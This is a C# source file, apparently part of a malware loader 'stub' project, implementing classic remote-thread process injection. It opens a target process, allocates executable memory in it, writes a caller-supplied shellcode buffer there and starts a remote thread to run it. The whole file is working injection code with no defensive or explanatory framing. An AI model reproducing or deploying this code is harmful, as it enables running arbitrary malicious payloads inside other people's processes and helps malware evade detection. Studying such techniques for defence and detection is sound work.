using System;
using System.Runtime.InteropServices;

namespace NRE.Stub.Injection
{
    /// <summary>
    /// Classic injection: OpenProcess, VirtualAllocEx, WriteProcessMemory, CreateRemoteThread.
    /// </summary>
    public static class RemoteThreadInjection
    {
        private const uint PROCESS_CREATE_THREAD = 0x0002;
        private const uint PROCESS_QUERY_INFORMATION = 0x0400;
        private const uint PROCESS_VM_OPERATION = 0x0008;
        private const uint PROCESS_VM_WRITE = 0x0020;
        private const uint PROCESS_VM_READ = 0x0010;
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr OpenProcess(uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, UIntPtr dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);

        private const uint INFINITE = 0xFFFFFFFF;

        public static bool Inject(uint processId, byte[] shellcode, bool waitForCompletion = false)
        {
            if (shellcode == null || shellcode.Length == 0) return false;
            uint access = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
            IntPtr hProcess = OpenProcess(access, false, processId);
            if (hProcess == IntPtr.Zero) return false;
            try
            {
                IntPtr remoteBuf = VirtualAllocEx(hProcess, IntPtr.Zero, (UIntPtr)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (remoteBuf == IntPtr.Zero) return false;
                UIntPtr written;
                if (!WriteProcessMemory(hProcess, remoteBuf, shellcode, (UIntPtr)shellcode.Length, out written))
                {
                    VirtualFreeEx(hProcess, remoteBuf, UIntPtr.Zero, 0x8000);
                    return false;
                }
                uint tid;
                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, UIntPtr.Zero, remoteBuf, IntPtr.Zero, 0, out tid);
                if (hThread == IntPtr.Zero)
                {
                    VirtualFreeEx(hProcess, remoteBuf, UIntPtr.Zero, 0x8000);
                    return false;
                }
                if (waitForCompletion)
                    WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
                return true;
            }
            finally
            {
                CloseHandle(hProcess);
            }
        }
    }
}
